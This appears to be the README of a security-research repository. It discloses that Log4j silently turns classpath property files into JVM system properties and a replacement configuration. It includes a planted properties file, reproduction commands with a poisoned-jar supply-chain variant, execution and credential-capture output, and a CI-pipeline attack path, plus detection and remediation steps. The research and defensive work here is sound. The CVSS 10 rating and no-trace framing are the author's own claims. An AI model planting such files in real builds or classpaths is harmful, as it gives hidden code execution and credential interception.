# Apache Log4j — the classpath resources Log4j trusts without asking

> **Disclosure status.**
> The behaviour itself is a documented Log4j convenience. The *security* consequence — that a
> classpath resource silently reconfigures the JVM and takes over Log4j's configuration — has
> not been reported to the Apache Logging Services project, not sent to any vendor, not shared
> with any third party, and not published in an advisory, mailing list post, blog, conference
> talk, preprint, issue tracker, or chat anywhere else.
>
> This finding was derived in the same audit as the configuration-time evaluation finding in
> <https://github.com/vindeckyy/log4j-config-time-lookup-rce>, and was moved into this
> repository for a separate disclosure.
>
> If you run Log4j and this affects you, please forward this to the vendor:
> <security@apache.org> (the Apache Logging Services security process, per
> <https://logging.apache.org/security.html>).

**Component:** `org.apache.logging.log4j:log4j-api` (the property loader) and
`org.apache.logging.log4j:log4j-core` (the configuration it hijacks)
**Severity:** Critical
**CVSS 3.1:** `10.0 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
**CWE:** CWE-426 (untrusted search path) → CWE-94 (improper control of generation of code) /
CWE-200 (information exposure) / CWE-613 (insufficient session expiration — the hijacked
configuration outlives the process that installed it)
**Affected:** `log4j-api` / `log4j-core` 2.14.1 – **2.26.1** (current release) — verified by
execution; the 3.x API source carries the same mechanism (source-level, see *Limitations*)
**Found:** 2026-10-23

---

## 0. Read this first

**One file. On the classpath. Anywhere on it. That is the whole attack.**

The file is called `log4j2.system.properties` or `log4j2.component.properties`. It is two
kilobytes of text. It does not have to be malicious in any way — it looks like a configuration
file, it sits next to the code, and it is read by Log4j before your application has printed a
single line.

When Log4j finds it, three things happen without asking anybody:

1. **every key in it becomes a JVM system property** of the running application;
2. **Log4j's own configuration is replaced** — the attacker decides the configuration file, and
   the file can be a resource inside the very same jar;
3. **the attacker's code runs** — before the application's first log statement, before the first
   request is served, before your monitoring notices anything.

Three facts that make this different from every Log4j issue before it:

| | |
| --- | --- |
| **It works on the current release.** | Log4Shell was closed in 2.17.1. This is unaffected by that fix, and by every fix after it. 2.26.1, the release in front of you right now, is vulnerable. |
| **It needs nothing from you.** | No attacker-controlled data in your logs. No Thread Context Map. No optional Log4j feature. No misconfiguration on your side. The application's configuration is what gets overwritten — your configuration is not a defence here, it is the target. |
| **It leaves no trace in your logs.** | `StatusLogger` says nothing. The attacker's configuration can set the log level, so it can also silence the very logs that would have shown the plant. You will not find this in your log pipeline. You will find it by auditing your classpath, or after it has been used. |

And the part that should worry an organisation most:

> **`log4j-api` alone is enough.** The primitive lives in the API artifact, not in the core. An
> application with no Log4j configuration, no Log4j appender, no logging provider at all — the API
> printing *"Log4j API could not find a logging provider"* — still has its JVM system properties
> rewritten by the planted file. The exposed population is therefore **every application that has
> Log4j somewhere on its classpath**, which in a typical Java estate is nearly all of them, and
> includes the ones where nobody would think to look for a logging vulnerability.

The full analysis, the evidence and the reproduction are below.

---

## 1. The defect in one paragraph

`log4j-api` reads two resources by fixed name from the classpath during its own initialization.
Neither file has to be requested, enabled, or mentioned in the application's configuration, and
neither produces a warning:

| file | effect |
| --- | --- |
| `log4j2.system.properties` | **every key is copied into the JVM system properties** |
| `log4j2.component.properties` | Log4j's own properties — configuration file location, script languages |

`log4j-api` 2.26.1, `org/apache/logging/log4j/util/PropertiesUtil.java:506-519`:

```java
private Environment(final PropertySource propertySource) {
    final PropertySource sysProps = new PropertyFilePropertySource(LOG4J_SYSTEM_PROPERTIES_FILE_NAME, false);
    try {
        sysProps.forEach((key, value) -> {
            if (System.getProperty(key) == null) {
                System.setProperty(key, value);          // global JVM state, from a classpath file
            }
        });
```

The file is found on the classpath through `util/PropertyFilePropertySource.java:50-55` →
`util/LoaderUtil.java:461-491`, which searches the thread-context class loader, Log4j's own
class loader and the **system class loader** — the application's entire classpath, jars
included.

Apache documents the mechanism in one line, with no security guidance attached
(<https://logging.apache.org/log4j/2.x/manual/systemproperties.html>):

> *"If a `log4j2.system.properties` file is available on the classpath its contents are sourced
> into Java system properties at Log4j startup."*

Two Log4j properties turn it into code execution: `log4j.configurationFile`
(`log4j-core` 2.26.1 `config/ConfigurationFactory.java:89`, read at `:457-460`) — the value may
name a **classpath resource**, so the attacker's configuration can travel inside the same jar —
and `log4j2.Script.enableLanguages` (`log4j-core` 2.26.1 `util/Constants.java:52`), which turns
on script execution that the attacker's configuration then uses.

**⇒ One file on the classpath reconfigures the JVM and replaces Log4j's configuration.**

---

## 2. What the attacker actually gets

The plant is not limited to "run some code once". Because it owns the application's Log4j
configuration, the attacker owns the application's logging behaviour as well.

| | consequence | how |
| --- | --- | --- |
| **Access** | Arbitrary code execution in the application JVM, with the application's privileges | configuration hijack → script filter (measured, §3) |
| **Collection** | The application's outbound traffic — including credentials in URLs, headers and request bodies — redirected to the attacker | `http.proxyHost` / `http.proxyPort` / `https.proxyHost` set as JVM system properties (measured, §5) |
| **Collection** | The application's TLS trust decisions replaced, so outbound TLS can be intercepted | `javax.net.ssl.trustStore` (same mechanism) |
| **Stealth** | The attacker's configuration decides what the application logs — the level, the layout, the destination. The evidence of the compromise can be configured out of existence | the victim's configuration file is replaced |
| **Persistence** | The compromise is not tied to a process. It is re-established on every restart, and it is carried by a file that is part of the artifact | the file lives in the jar or in the deployment directory |
| **Reach** | Every application on the classpath, every restart, every environment that gets the artifact | one file, many victims |

The point about persistence deserves emphasis: this is not a race against a restart, and not a
single compromised host. A file inside a jar is deployed by the normal release process, to every
environment that consumes the artifact, including production.

---

## 3. The chain to RCE, measured

The planted `log4j2.system.properties` (three lines):

```properties
lab.planted=planted-by-attacker
log4j.configurationFile=pwn.xml
log4j2.configurationFile=pwn.xml
log4j2.Script.enableLanguages=Groovy
```

The planted `pwn.xml` on the same classpath: a normal Log4j configuration whose `ScriptFilter`
runs a Groovy script. Running an ordinary application — no Log4j configuration of its own, no
attacker-controlled log content, no MDC:

```
[1] planted system property BEFORE log4j init : null
=== PAYLOAD EXECUTED IN VICTIM JVM (planted config) ===
RCE via planted log4j2.system.properties (classpath pre-positioning) as hayden
uid=1000(hayden) gid=1000(hayden) groups=1000(hayden),4(adm),24(cdrom),27(sudo),...
=== END PAYLOAD ===
13:03:23 INFO  victim - first log statement triggers log4j initialization
[2] planted system property AFTER  log4j init : planted-by-attacker
[3] effective log4j config location             : pwn.xml
[4] script languages enabled                     : Groovy
[5] attacker script executed (marker file)       : true
```

Read the order of those lines again: the payload executed **before** the application's own log
statement was rendered. The attacker's configuration replaced the victim's, and the script filter
runs during configuration initialisation. There is no window in which the victim could have
noticed.

| vector | file on the classpath | result |
| --- | --- | --- |
| A — JVM system properties | `log4j2.system.properties` | RCE, plus arbitrary JVM system properties |
| B — Log4j configuration | `log4j2.component.properties` | RCE (the file alone, without variant A) |
| C — supply chain | either file **inside a dependency jar** | RCE |

| log4j-core | 2.14.1 | 2.17.1 | 2.24.0 | 2.25.1 | **2.26.1** |
| --- | --- | --- | --- | --- | --- |
| RCE via planted classpath resource | yes | yes | yes | yes | **yes** |

Negative control — the same application without the planted file:

```
[2] planted system property AFTER  log4j init : null
[3] effective log4j config location             : null
[4] script languages enabled                     : null
[5] attacker script executed (marker file)       : false
```

---

## 4. The blast radius is `log4j-api`, not `log4j-core`

With **only `log4j-api` on the classpath** — no `log4j-core`, no appender, no configuration, and
the API reporting *"Log4j API could not find a logging provider"* — the planted file still
rewrites the JVM's system properties:

```
[api-only] planted property BEFORE log4j init : null
2026-10-23T17:03:44.240Z main ERROR Log4j API could not find a logging provider.
[api-only] planted property AFTER  log4j init : planted-by-attacker
[api-only] log4j.configurationFile             : pwn.xml
```

`log4j-api` is a transitive dependency of a large part of the Java ecosystem, so the exposed
population is "every application that has Log4j on its classpath", not "every application that
configured Log4j".

---

## 5. The plant reaches past Log4j

Because it sets **JVM** system properties, it reaches application behaviour that has nothing to
do with logging. With `http.proxyHost` / `http.proxyPort` planted, the victim's outbound request
went to the attacker's proxy:

```
--- victim stdout ---
[proxy-victim] http.proxyHost = 127.0.0.1
[proxy-victim] http.proxyPort = 8899
[proxy-victim] response status = 200
--- captured by attacker proxy ---
GET http://vault.internal/api/login?user=alice&token=s3cr3t HTTP/1.1
User-Agent: Java/1.8.0_504
Host: vault.internal
```

The credentials in the request URL were read by the attacker because a file on the classpath
said so. The same mechanism reaches `javax.net.ssl.trustStore` (the application's TLS trust
decisions), `https.proxyHost`, and any property a library reads lazily.

---

## 6. How far this reaches

**Pre-positioning.** One file with a fixed, guessable name in a directory that is on the
victim's classpath and writable by someone else:

* a shared application server or deployment directory (`/opt/app/lib`, `WEB-INF/lib`) writable by
  the deploy account while the service runs as another account;
* a build agent or CI runner whose workspace is on the classpath — including the current
  directory, which is on the classpath for a large share of legacy start scripts;
* any writable directory in a container image that is passed with `-cp`.

**Supply chain.** The file can equally live *inside a jar*; measured, a single jar carrying
`log4j2.system.properties` and `pwn.xml` produced the same RCE. That makes the delivery vector
a dependency: one poisoned or compromised artifact reaches every application that resolves it,
and the file stays inert until Log4j runs in that application. Nothing in the artifact looks
like an attack — two small text files with innocuous names, in a jar that a reviewer opens once.

**The worst realistic path.** A build agent or CI runner that builds artifacts from a workspace
another account can write to. The attacker writes the two files into the build output. The
normal release process packages them into the artifact. Every environment that consumes the
artifact — staging, production, every region — runs the attacker's configuration on start-up,
silently, with no log line and no crash. From the application's point of view nothing happened;
from the attacker's point of view, every instance is already theirs.

This is why the exposure is a *host and pipeline* problem rather than an *application* problem:
the attacker does not need to find the application, does not need to interact with it, and does
not need to be lucky.

---

## 7. Compared with Log4Shell

| | Log4Shell (CVE-2021-44228) | this finding |
| --- | --- | --- |
| Vulnerable versions required | yes — fixed in 2.17.1 | **no — the current release is affected** |
| Attacker-controlled data must reach the log path | yes | **no** |
| Thread Context Map involvement | in some variants | **no** |
| Application's configuration must be unusual | no | **no** — the configuration is what gets replaced |
| Any optional Log4j feature must be enabled | no | **no** — scripting is enabled by the planted file |
| Affects applications that only have `log4j-api` | no | **yes** |
| Leaves a trace in the logs | often (errors, outbound LDAP) | **no** — the attacker's configuration controls the logs |
| Needs the victim to do something | send a request | **no** |
| Delivery | a string in a request | **a file on the classpath** |

---

## 8. Reproduce it (localhost only)

```bash
./setup.sh                 # fetch jars + the Log4j sources cited in WORKUP.md
./lab/build.sh             # compile the victims
./lab/verify.sh            # 14 assertions over every claim in WORKUP.md
```

By hand:

```bash
# the planted classpath resource + the attacker's configuration
ls lab/poison/                       # log4j2.system.properties, pwn.xml
CP=lib/log4j-api-2.26.1.jar:lib/log4j-core-2.26.1.jar:lib/groovy-4.0.24.jar:lib/groovy-jsr223-4.0.24.jar
java -cp "$CP:lab/build/victim:lab/poison" lab.ClasspathPoison
# -> PAYLOAD EXECUTED IN VICTIM JVM (planted config)

# the supply-chain case: the planted resource inside a dependency jar
java -cp "$CP:lab/build/victim:lab/build/evil-dependency.jar" lab.ClasspathPoison

# the traffic impact
python3 lab/proxy_capture.py java -cp "lib/log4j-api-2.26.1.jar:lib/log4j-core-2.26.1.jar:lab/build/victim:lab/poison-proxy" lab.ProxyVictim
```

All traffic binds to `127.0.0.1`. The lab contacts no third-party host, scans nothing, and
carries no target list. The command it executes in the victim JVM is `id`.

---

## 9. Detection

* Find the files: `find / -name 'log4j2.*.properties'`, and inside every jar
  `unzip -l <jar> | grep log4j2`. `scan/scan_planted.py` does both (on disk and inside jars).
* Compare a running service's JVM system properties against the application's own configuration:
  any difference is the plant.
* Look for a Log4j configuration inside a jar or directory that the deployment did not put there.
* Look for outbound HTTP(S) from the application at start-up or at reconfiguration — a
  configuration that fetches a script from a URL is visible on the wire.
* `StatusLogger` messages: `Error running script …`, `No script with name … has been declared`.

---

## 10. Remediation

Do these now:

* **Audit every classpath** — every deployment directory, every container image, every jar in
  every artifact — for `log4j2.system.properties` and `log4j2.component.properties`. Treat a
  match as an incident, not as a finding.
* **Make the classpath a trust boundary.** Nothing on it may be writable by anyone other than
  the identity that runs the application. Verify every jar on it by checksum in CI.
* **Remove the files** from artifacts and from deployment directories, and re-build and re-deploy
  the artifacts that contained them.
* **Keep scripting disabled** (`log4j2.Script.enableLanguages` unset) — it is the execution
  path the plant uses, and an environment without a JSR-223 engine fails closed.

Upstream, Log4j should not silently promote a classpath resource into JVM system properties. At
minimum it should:

* require an explicit opt-in for that behaviour;
* log a warning through `StatusLogger` when either file is found;
* refuse to take the configuration file location from a classpath resource.

---

## 11. Repository contents

| Path | What it is |
| --- | --- |
| `WORKUP.md` | the full write-up: root cause with `file:line` evidence, the measured exploitability matrix, the target/reach/impact analysis, detection, remediation, and limitations |
| `lab/` | the proof-of-concept: victim apps, the planted classpath resources, the attacker-side proxy, and `verify.sh` |
| `scan/scan_planted.py` | finds planted Log4j classpath resources on disk and inside jars |
| `setup.sh` | downloads the jars and the sources the citations point at |
| `lib/`, `sources/`, `lab/build/` | downloaded artifacts and build output, created by `setup.sh` and `lab/build.sh` — not stored in git |

A sibling repository, <https://github.com/vindeckyy/log4j-config-time-lookup-rce>, documents a
separate finding in the same project: configuration-time evaluation of untrusted Thread Context
Map data.

---

## 12. Scope and ethics

* Every server in this repository listens on `127.0.0.1`; no external host is ever contacted.
* The payload executes `id` and writes a proof file; it does not persist, spread, or scan.
* No third-party system was tested, scanned, or contacted at any point.
* These labs are for testing systems you own or are authorised to test. This finding needs a
  writable classpath entry or a poisoned dependency — that is the access condition, not a
  vulnerability in the target application.

---

## 13. Limitations

* Log4j 3.x is analysed at source level only: `log4j-core:3.0.0-beta3` needs
  `log4j-api:3.0.0-beta3`, which is not published (`log4j-api` stops at `3.0.0-beta2`), and the
  two do not load together. The 3.0.0-beta2 API source still contains the mechanism
  (`util/PropertiesUtil.java:70, 675-682`).
* The JMX variant was tested and rejected: the JMX agent reads its configuration during JVM
  start-up, before Log4j initializes. Properties the JVM reads at start-up are therefore out of
  reach; properties read lazily (proxy, TLS trust store, most libraries) are in reach.
* The plant needs a writable classpath entry or a poisoned dependency. That is the access
  condition; Log4j's contribution is that it trusts a fixed-name classpath resource implicitly,
  silently, and — for `log4j2.system.properties` — applies it as global JVM state.
* The script chain was demonstrated with Groovy; any other JSR-223 engine behaves the same.
* The worst-case deployment path in §6 is an analysis of the mechanism, not a measured
  compromise of a real pipeline.

---

## 14. License

Apache License 2.0 — see `LICENSE`.
